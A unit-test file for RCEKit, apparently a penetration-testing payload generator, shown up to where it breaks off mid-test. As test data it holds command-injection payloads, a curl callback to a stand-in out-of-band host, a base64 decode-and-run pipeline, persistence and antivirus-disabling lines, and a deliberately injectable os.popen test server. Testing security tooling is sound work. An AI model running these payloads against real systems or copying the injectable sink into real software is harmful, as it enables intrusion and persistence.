"""Unit tests for RCEKit.

Run with: python -m unittest discover -s tests  (no third-party deps required)

These tests lock in the properties that matter to the real consumer of this
tool: every emitted payload should be unique and executable/decodable, the
removed obfuscation transforms must stay removed, and the safety filters and
detection mode must behave as documented.
"""

import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import rcekit  # noqa: E402
from rcekit import (  # noqa: E402
    EvalExpr,
    FileBased,
    Observation,
    OOBListener,
    ParametricTime,
    PayloadRecord,
    Probe,
    RCEKit,
    ReflectedMath,
    build_request_inputs,
    parse_raw_request,
)


def make_record(**overrides):
    """A minimal PayloadRecord for exercising the verification oracle."""
    base = dict(
        payload="; id", mode="exploit", category="basic_enum", environment="unix",
        context="raw", encoding="none", sink=None, indicator="", safety="intrusive",
        expected_channel="response", runner="sh",
    )
    base.update(overrides)
    return PayloadRecord(**base)


import contextlib  # noqa: E402


@contextlib.contextmanager
def local_target(route):
    """Spin up a throwaway local HTTP target for detection tests. ``route`` is
    ``route(method, path, params, headers, body) -> (status, text)`` and stands
    in for the vulnerable app. Yields the base URL; tears the server down after."""
    import http.server
    import socketserver
    import threading
    import urllib.parse as up

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _handle(self, method):
            parsed = up.urlparse(self.path)
            params = {k: v[0] for k, v in up.parse_qs(parsed.query).items()}
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace") if length else ""
            status, text = route(method, parsed.path, params, dict(self.headers), body)
            self.send_response(status)
            self.end_headers()
            try:
                self.wfile.write(text.encode(errors="replace"))
            except BrokenPipeError:
                pass

        def do_GET(self):
            self._handle("GET")

        def do_POST(self):
            self._handle("POST")

    server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "rcekit.py"


class VersionTestCase(unittest.TestCase):
    def test_version_is_semver(self):
        self.assertRegex(rcekit.__version__, r"^\d+\.\d+\.\d+$")


class CLITestCase(unittest.TestCase):
    """Exercise the real CLI (argparse + main) via subprocess, not just the API."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_help(self):
        result = self._run("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn("--verify-url", result.stdout)
        self.assertIn("--listen", result.stdout)

    def test_version_flag(self):
        result = self._run("--version")
        self.assertEqual(result.returncode, 0)
        self.assertRegex(result.stdout.strip(), r"\d+\.\d+\.\d+$")

    def test_exploit_requires_consent(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertIn("consent", (result.stdout + result.stderr).lower())

    def test_detection_only_writes_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(out.exists() and out.read_text().strip())

    def test_jsonl_records_are_valid(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.jsonl"
            self._run("--detection-only", "--environments", "unix",
                      "--output-format", "jsonl", "-o", str(out))
            lines = [l for l in out.read_text().splitlines() if l.strip()]
            self.assertTrue(lines)
            for line in lines:
                json.loads(line)  # each record must be valid JSON

    def test_nuclei_export_produces_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            result = self._run("--detection-only", "--environments", "unix",
                                "--output-format", "nuclei", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(list((Path(tmp) / "run_nuclei").glob("*.yaml")))

    def test_target_profile_end_to_end(self):
        profile = REPO_ROOT / "profiles" / "quote-filtered-unix.json"
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = self._run("--acknowledge-consent", "--target-profile", str(profile),
                               "--encodings", "none", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            text = out.read_text()
            self.assertTrue(text.strip())
            self.assertNotIn('"', text)  # profile denies quote characters


class OOBListenerTestCase(unittest.TestCase):
    def setUp(self):
        self.tokens = {"abc123token": {"payload": "; curl http://abc123token.oob.test/",
                                       "category": "oob", "context": "raw"}}
        self.listener = OOBListener(tokens=self.tokens)

    def test_correlates_token_from_host(self):
        hit = self.listener.record("http", "10.0.0.5", "abc123token.oob.test", "/")
        self.assertEqual(hit["token"], "abc123token")
        self.assertEqual(hit["payload"], "; curl http://abc123token.oob.test/")

    def test_correlates_token_from_path_exfil(self):
        hit = self.listener.record("http", "10.0.0.5", "", "/abc123token")
        self.assertEqual(hit["token"], "abc123token")

    def test_unknown_token_reported_without_payload(self):
        hit = self.listener.record("dns", "10.0.0.5", "unknownlabel.oob.test", "")
        self.assertIsNone(hit["payload"])
        self.assertEqual(hit["token"], "unknownlabel")

    def test_dns_query_is_parsed_and_answered(self):
        def encode(name):
            return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
        query = b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3 + encode("abc123token.oob.test") + b"\x00\x01\x00\x01"
        self.assertEqual(self.listener._parse_dns_qname(query), "abc123token.oob.test")
        response = self.listener._dns_response(query)
        self.assertEqual(response[:2], query[:2])       # same transaction id
        self.assertEqual(response[6:8], b"\x00\x01")     # one answer

    def test_live_http_callback_is_recorded(self):
        import urllib.request
        server = self.listener.start_http(0)
        try:
            port = server.server_address[1]
            req = urllib.request.Request(f"http://127.0.0.1:{port}/",
                                         headers={"Host": "abc123token.oob.test"})
            urllib.request.urlopen(req, timeout=3).read()
            import time
            time.sleep(0.1)
            self.assertTrue(any(h["payload"] for h in self.listener.hits))
        finally:
            server.shutdown()
            server.server_close()


class GeneratorTestCase(unittest.TestCase):
    def setUp(self):
        self.gen = RCEKit()

    def test_templates_loaded(self):
        self.assertTrue(self.gen.payload_categories, "payload categories should load")
        self.assertIn("basic_enum", self.gen.payload_categories)
        self.assertTrue(self.gen.detection_payloads, "detection payloads should load")

    def test_yaml_template_is_rejected_without_a_third_party_parser(self):
        # RCEKit is stdlib-only: a YAML template must fail with a clear error
        # rather than attempting to import a third-party YAML parser.
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "corpus.yaml"
            path.write_text("payload_categories: {}\n", encoding="utf-8")
            gen = RCEKit(template_path=path)
            self.assertFalse(gen.payload_categories)
            self.assertIsNotNone(gen.template_error)
            self.assertIn("YAML templates are not supported", gen.template_error)

    def test_removed_encodings_are_gone(self):
        removed = {"rot13", "rot13_then_base64", "insert_special_chars",
                   "xor_polymorphic", "chunk_shuffle"}
        self.assertEqual(removed & set(self.gen.encoding_methods), set())

    def test_no_garbage_or_non_executable_markers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix", "windows"],
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertNotIn("XOR(", rec.payload)
            self.assertNotIn("shuffle::", rec.payload)

    def test_payloads_are_unique(self):
        payloads = [r.payload for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"],
        )]
        self.assertEqual(len(payloads), len(set(payloads)), "no duplicate payloads")

    def test_random_case_only_for_case_insensitive_runners(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_encodings=["random_case"],
        ) if r.encoding == "random_case"]
        self.assertTrue(records, "random_case should still apply somewhere")
        for rec in records:
            self.assertIn(rec.runner, self.gen.case_insensitive_runners)

    def test_encoding_compatibility_rules(self):
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "python"))
        self.assertTrue(self.gen._encoding_is_compatible("random_case", "cmd"))
        self.assertTrue(self.gen._encoding_is_compatible("base64", "python"))
        # The self-contained decode-and-run harness is shell-only.
        self.assertTrue(self.gen._encoding_is_compatible("base64_decode_exec", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("base64_decode_exec", "python"))

    def test_default_encodings_exclude_decoder_required_blobs(self):
        encodings = {r.encoding for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"],
        )}
        # Bare base64/hex blobs must not appear by default (they do nothing
        # unless the sink decodes them).
        self.assertFalse(encodings & self.gen.decoder_required_encodings)

    def test_base64_decode_exec_is_self_contained_and_runnable(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64_decode_exec"],
        )]
        self.assertTrue(records)
        for record in records:
            # Carries its own decoder pipeline, so it runs as-is on a shell.
            self.assertIn("|base64 -d|sh", record.payload)

    def test_decoder_required_encodings_are_opt_in(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64"],
        )]
        self.assertTrue(records)
        self.assertTrue(all(r.encoding == "base64" for r in records))

    def test_detection_mode_is_safe(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", max_safety="safe",
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertEqual(rec.mode, "detection")
            self.assertEqual(rec.safety, "safe")

    def test_max_safety_excludes_higher_tiers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"],
            selected_environments=["unix"],
            max_safety="safe",
        ))
        self.assertEqual(records, [], "persistence is stateful and must be filtered at safe tier")

    def test_sleep_family_is_classified_blocking(self):
        blocking = ["sleep 5", "time.sleep(2)", "Thread.sleep(2000)",
                    "time.Sleep(1 * time.Second)", "pg_sleep(1)", "SELECT pg_sleep(1);",
                    "Start-Sleep -Seconds 3", "select(undef, undef, undef, 1)", "timeout /T 5"]
        for payload in blocking:
            self.assertTrue(self.gen._is_blocking(payload), payload)
        for payload in ["id", "cat /etc/passwd", "setTimeout(()=>x,1000)", "whoami"]:
            self.assertFalse(self.gen._is_blocking(payload), payload)

    def test_blocking_excluded_by_default(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", include_blocking=False, max_safety="stateful",
        ))
        self.assertTrue(all(not r.blocking for r in records))

    def test_watermark_embedded_when_token_present(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
            watermark_token="TESTTOKN",
        ))
        self.assertTrue(records)
        self.assertTrue(any("TESTTOKN" in r.payload for r in records))

    def test_no_watermark_by_default(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "code_execution"],
            selected_environments=["unix", "python"],
        ))
        self.assertTrue(records)
        self.assertFalse(any("RCEKit-ID" in r.payload for r in records))

    def test_code_payloads_not_quote_wrapped(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # The raw snippet must appear executable, never wrapped into an inert
        # string literal such as "os.system('whoami')".
        self.assertIn("os.system('whoami')", payloads)
        self.assertNotIn('"os.system(\'whoami\')"', payloads)

    def test_ssti_delimiters_preserved(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python", "java"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # SSTI payloads must keep their template delimiters intact.
        self.assertIn("{{7*7}}", payloads)
        self.assertTrue(any(p.startswith("${") for p in payloads))

    def test_waf_bypass_payloads_are_quote_free(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["waf_bypass"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(any("${IFS}" in r.payload for r in records))
        # The whole point is command injection without quote characters.
        for record in records:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)

    def test_oob_requires_domain_and_gets_unique_tokens(self):
        # Without an OOB domain, {oob} payloads are dropped entirely.
        without = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        self.assertEqual(without, [])

        # With a domain, each record carries a unique correlation token/host.
        with_dom = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="oast.example.com",
        ))
        self.assertTrue(with_dom)
        tokens = [r.token for r in with_dom]
        self.assertTrue(all(tokens), "every OOB record must carry a token")
        self.assertEqual(len(tokens), len(set(tokens)), "OOB tokens must be unique")
        for record in with_dom:
            self.assertIn(record.oob_host, record.payload)
            self.assertTrue(record.oob_host.endswith(".oast.example.com"))
            self.assertEqual(record.expected_channel, "interactsh")

    def test_command_payloads_carry_match_signatures(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        by_payload = {r.payload: r.match for r in records}
        # `id` output is a recognisable uid= line; /etc/passwd starts with root:.
        self.assertEqual(by_payload.get("; id"), r"uid=\d+")
        self.assertTrue(any(m and "root:" in m for m in by_payload.values()))
        # A signature must actually match real output.
        self.assertRegex("uid=0(root) gid=0(root)", by_payload["; id"])

    def test_canary_match_is_the_token_and_oob_has_none(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"], oob_domain="x.oast.pro",
            max_safety="stateful", include_blocking=True,
        ))
        canaries = [r for r in records if r.token and r.expected_channel in {"response", "stderr"}]
        self.assertTrue(canaries)
        for record in canaries:
            self.assertEqual(record.match, record.token)
        oob = [r for r in records if r.expected_channel == "interactsh"]
        self.assertTrue(oob)
        self.assertTrue(all(r.match is None for r in oob))

    def test_destructive_flagging(self):
        self.assertTrue(self.gen._is_destructive("echo x >> ~/.bashrc", "persistence"))
        self.assertTrue(self.gen._is_destructive("rm -rf /tmp/x", "file_operations"))
        self.assertTrue(self.gen._is_destructive("Set-MpPreference -DisableRealtimeMonitoring $true", "persistence"))
        self.assertFalse(self.gen._is_destructive("id", "basic_enum"))
        self.assertFalse(self.gen._is_destructive("cat /etc/passwd", "file_operations"))
        # The record field is populated from the payload/category.
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"], max_safety="stateful",
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.destructive for r in records))

    def test_mongodb_and_graphql_sinks_present(self):
        mongo = [r for r in self.gen.generate_payload_records(
            selected_categories=["nosql_injection"], selected_environments=["mongodb"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(mongo)
        self.assertTrue(all(r.environment == "mongodb" for r in mongo))
        self.assertTrue(any("$where" in r.payload for r in mongo))
        self.assertTrue(any("$function" in r.payload for r in mongo))

        gql = [r for r in self.gen.generate_payload_records(
            selected_categories=["graphql_injection"], selected_environments=["graphql"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(gql)
        self.assertTrue(any("__schema" in r.payload for r in gql))
        # GraphQL / Mongo payloads must not be prefixed with shell separators.
        self.assertTrue(all(not r.payload.startswith((";", "|", "&")) for r in mongo + gql))

    def test_java_expression_sinks_added(self):
        sinks = {
            r.sink for r in self.gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["java"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
        }
        self.assertTrue({"spel", "ognl", "groovy"}.issubset(sinks))

    def test_json_context_escapes_payload(self):
        # A Java payload uses double quotes, which must be escaped to stay a
        # valid JSON string value.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["json"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            # Each payload must parse as the body of a JSON string.
            json.loads('"' + record.payload + '"')
        self.assertTrue(any('\\"' in r.payload for r in records))

    def test_xml_context_entity_escapes(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["xml"], selected_encodings=["none"],
        ))
        self.assertTrue(any("&quot;" in r.payload for r in records))
        self.assertFalse(any('"' in r.payload for r in records))

    def test_transport_context_carries_any_environment(self):
        # A serialization context is compatible with a non-shell environment.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["yaml"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.context == "yaml" for r in records))

    def test_shell_quoted_context_breaks_out_cleanly(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["shell_single_quoted"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            self.assertTrue(record.payload.startswith("'; "))
            self.assertNotRegex(record.payload, r";\s*;")  # no ";;" syntax error
        # Shell-quoted contexts are not offered to non-shell environments.
        self.assertFalse(self.gen._is_context_compatible("shell_single_quoted", "python", True))

    def test_default_contexts_exclude_transport_contexts(self):
        # A default run (no --contexts) must not silently include the richer
        # opt-in contexts, keeping output size and behaviour stable.
        contexts = {r.context for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
        )}
        self.assertNotIn("json", contexts)
        self.assertNotIn("shell_single_quoted", contexts)

    def test_sink_needs_separator_keeps_only_breakouts(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records))
        # The bare command (no separator) can't fire mid-command; it must be gone.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # A separator-led variant must survive.
        self.assertIn("; id", [r.payload for r in filtered])

    def test_sink_needs_separator_judges_encoded_payloads_by_canonical_form(self):
        # Separator-validity must be decided on the pre-encoding payload, not the
        # final string: a url-encoded bare command still can't fire mid-command,
        # while a url-encoded break-out still can.
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none", "url_encode"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        # Encoded bare command (decodes to plain "id") cannot break out -> dropped.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # Encoded break-out (";" percent-escaped) is still a valid separator once
        # the sink decodes it, so it must survive even though its literal form no
        # longer starts with a separator.
        self.assertIn("%3B%20id", [r.payload for r in records])
        self.assertIn("%3B%20id", [r.payload for r in filtered])
        # Nothing that survives should be an encoded bare command.
        for record in filtered:
            self.assertTrue(record.separator_led)

    def test_sink_blind_keeps_only_out_of_band_confirmable(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
        ))
        filtered = list(self.gen._filter_by_profile(records, blind=True))
        self.assertTrue(filtered)
        for record in filtered:
            self.assertTrue(record.blocking or record.oob_host or record.expected_channel == "interactsh")
        # Plain reflected `echo`/`id` payloads (response-only) must be dropped.
        self.assertFalse(any(r.payload == "; id" for r in filtered))

    def test_profile_filter_drops_denied_chars_and_long_payloads(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations", "waf_bypass"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, deny_chars="'\"", max_length=40))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records), "the filter must actually drop something")
        for record in filtered:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)
            self.assertLessEqual(len(record.payload), 40)
        # A quote-free WAF-bypass payload should survive the quote filter.
        self.assertTrue(any("${IFS}" in r.payload for r in filtered))

    def test_target_profile_file_applies_end_to_end(self):
        profile = Path(__file__).resolve().parent.parent / "profiles" / "quote-filtered-unix.json"
        self.assertTrue(profile.exists(), "example profile should ship with the repo")
        import json
        spec = json.loads(profile.read_text())
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out),
                deny_chars="".join(spec["deny_chars"]),
                max_length=spec["max_length"],
                selected_environments=spec["environments"],
                selected_contexts=spec["contexts"],
                selected_categories=spec["categories"],
                selected_encodings=spec["encodings"],
                oob_domain=spec.get("oob_domain"),
            )
            lines = out.read_text().splitlines()
            self.assertTrue(lines)
            for line in lines:
                self.assertNotIn('"', line)
                self.assertNotIn("'", line)
                self.assertLessEqual(len(line), spec["max_length"])

    def test_burp_export_writes_context_wordlists(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_burp"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertTrue(any(outdir.glob("payloads-*.txt")))
            # Without a target profile Burp users set positions themselves, so no
            # generic placeholder request is fabricated.
            self.assertFalse((outdir / "request.txt").exists())

    def test_wordlist_export_honours_selected_encodings(self):
        # The exporter must not silently drop encoded variants: an encoding the
        # tools cannot reproduce (or simply one the user asked for) belongs in the
        # wordlist as a literal line.
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none", "base64_decode_exec"],
            )
            allp = (Path(tmp) / "run_burp" / "payloads-all.txt").read_text()
            self.assertIn("; id", allp)
            self.assertTrue(any("base64 -d" in line for line in allp.splitlines()),
                            "self-contained encoded variants must survive into the wordlist")

    def test_ffuf_export_with_profile_is_runnable(self):
        request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            req = (outdir / "request.txt").read_text()
            # A real FUZZ marker, not Burp's section sign.
            self.assertIn('{"host": "FUZZ"}', req)
            self.assertNotIn("\xa7", req)
            run = (outdir / "run.sh").read_text()
            self.assertIn("ffuf -request request.txt -w payloads-all.txt", run)
            self.assertIn("-request-proto https", run)

    def test_ffuf_export_without_profile_writes_wordlists_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            # No injection point -> no fabricated request or runner.
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_path_only_profile_is_not_runnable(self):
        # A path-only URL cannot name the target host, so ffuf has nothing to run
        # against -> wordlists only, no misleading request.txt/run.sh pointing at
        # a placeholder host.
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_clears_stale_request_artifacts(self):
        # A profile-backed run followed by a wordlist-only run on the same output
        # directory must not leave the old request.txt/run.sh behind, or an
        # operator could fire a stale runner at the previous target.
        abs_request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                       "headers": {"Content-Type": "application/json"},
                       "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            outdir = Path(tmp) / "run_ffuf"
            # First run: concrete host -> request.txt + run.sh created.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=abs_request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "request.txt").exists())
            self.assertTrue((outdir / "run.sh").exists())
            # Second run on the same dir with no profile -> stale runner is gone.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_export_is_profile_request_aware(self):
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            # Burp request.txt reflects the profile's method/path/body.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            burp_req = (Path(tmp) / "run_burp" / "request.txt").read_text()
            self.assertIn("POST /api/v1/lookup HTTP/1.1", burp_req)
            self.assertIn("Content-Type: application/json", burp_req)
            self.assertIn('{"host": "\xa7payload\xa7"}', burp_req)

            # Nuclei templates embed the same request with the payload marker.
            out2 = Path(tmp) / "run2.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out2), output_format="nuclei", request_template=request,
                selected_environments=["unix"], mode="detection",
                max_safety="stateful", include_blocking=True,
            )
            templates = "\n".join(t.read_text() for t in (Path(tmp) / "run2_nuclei").glob("*.yaml"))
            self.assertIn("POST /api/v1/lookup HTTP/1.1", templates)
            self.assertIn('{"host": "{{payload}}"}', templates)

    def test_nuclei_export_writes_valid_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="nuclei",
                selected_environments=["unix"], mode="detection",
                oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_nuclei"
            templates = list(outdir.glob("*.yaml"))
            self.assertTrue(templates)
            joined = "\n".join(t.read_text() for t in templates)
            # OOB templates must use the interactsh placeholder, not a real host.
            self.assertIn("{{interactsh-url}}", joined)
            self.assertIn("interactsh_protocol", joined)
            # Time templates normalise sleeps and never include hanging tails.
            time_files = list(outdir.glob("*-time.yaml"))
            if time_files:
                time_text = "\n".join(t.read_text() for t in time_files)
                self.assertIn("duration>=6", time_text)
                self.assertNotIn("tail -f", time_text)


    def test_verify_confirms_execution_against_local_target(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = os.popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the harness must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_timing_oracle_requires_a_reproducible_delay(self):
        # A blocking/timing payload is only "confirmed" when the delay clears the
        # noise margin AND reproduces on the re-fire; a one-off spike is jitter.
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=8.1)
        self.assertEqual(confirmed, "confirmed")
        # First request was slow but the delay did not reproduce -> not execution.
        jitter, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=1.2)
        self.assertEqual(jitter, "no-delay")
        # Below the margin at all -> not a delay.
        quick, _ = self.gen._evaluate_verify(
